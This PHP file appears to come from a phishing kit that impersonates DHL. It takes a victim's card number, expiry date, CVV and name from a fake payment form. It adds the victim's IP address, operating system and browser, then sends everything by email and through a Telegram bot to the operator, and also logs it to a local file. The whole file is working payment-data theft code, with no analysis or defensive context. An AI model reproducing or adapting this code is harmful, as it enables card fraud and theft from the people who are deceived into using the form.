<?php

// by https://t.me/X911_tools
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../Variablex/Protection.php');
include('../Variablex/COUNTRY.php');
include('../Variablex/SYS.php');
include('../Variablex/XTelegram.php');

function validateCardNumber($number) {
    $number = preg_replace('/\D/', '', $number);

    $length = strlen($number);
    if ($length < 15 || $length > 16) {
        return false;
    }

    $sum = 0;
    for ($i = 0; $i < $length; $i++) {
        $digit = (int) $number[$i];
        if (($length - $i) % 2 == 0) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    return $sum % 10 == 0;
}

if (isset($_POST['submit'])) {
    if (validateCardNumber($_POST['one'])) {
        header("Location: ../Loa.php?FGDD=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG#_$dispatch"); 
    } else {
        header("Location: ../B.php?error=invalidCardNumber"); 
        exit();
    }

	$message =  "🌟 *------- [DHL - Payment Card ] -------*\n";
	$message .= "🌎 Cardholder Full Name: " . $_POST['full'] . "\n";
	$message .= "💳 Card Number: " . str_replace(' ', '', trim($_POST['one'])) . "\n";
	$message .= "📅 Expiration Date: " . $_POST['two'] . "\n";
	$message .= "🔑 CVV: " . $_POST['three'] . "\n";

	$message .= "🔒 *------- [DHL - USER DATA] -------*\n";
	$message .= "🌍 Country: #" . $get_user_country . "\n";
	$message .= "💻 IP Address: " . $ip . "\n";
	$message .= "💻 Operating System: " . $user_os . "\n";
	$message .= "🌐 Browser: " . $user_browser . "\n";
	$message .= "⏰ Timestamp: " . $date . "\n";

	$subject = "*------- [CCV-DHL] -------*";
	$headers = "From: CCV@DHL.com\r\n";
	$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";


    mail($to, $subject, $message, $headers);

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    $_SESSION['one'] = $_POST['one'];

    $file = fopen('XD.txt', 'a');
    fwrite($file, $message . "\n");
    fclose($file);
}
?>